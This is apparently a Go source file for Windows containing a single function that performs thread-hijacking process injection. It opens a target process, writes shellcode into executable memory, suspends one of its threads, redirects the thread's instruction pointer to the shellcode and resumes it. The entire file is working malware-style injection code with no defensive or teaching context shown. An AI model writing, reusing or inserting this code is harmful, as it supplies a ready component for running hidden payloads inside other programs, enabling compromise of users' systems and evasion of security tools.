//go:build windows

package main

import (
	"fmt"
	"unsafe"
)

func hijackThread(pid uint32, shellcode []byte) error {
	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	defer procCloseHandle.Call(hProc)

	addr, err := allocateRX(hProc, shellcode)
	if err != nil {
		return fmt.Errorf("allocateRX failed: %w", err)
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	var targetTID uint32
	var found bool
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			targetTID = te.th32ThreadID
			found = true
			break
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	if !found {
		return fmt.Errorf("no thread found in pid %d", pid)
	}

	hThread, _, _ := procOpenThread.Call(
		uintptr(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT),
		0, uintptr(targetTID),
	)
	if hThread == 0 {
		return fmt.Errorf("OpenThread(%d) failed", targetTID)
	}
	defer procCloseHandle.Call(hThread)

	procSuspendThread.Call(hThread)

	var ctx threadContext
	ctx.contextFlags = CONTEXT_FULL
	r2, _, _ := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	if r2 == 0 {
		procResumeThread.Call(hThread)
		return fmt.Errorf("GetThreadContext failed for thread %d", targetTID)
	}

	ctx.rip = uint64(addr)
	procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
	procResumeThread.Call(hThread)
	return nil
}
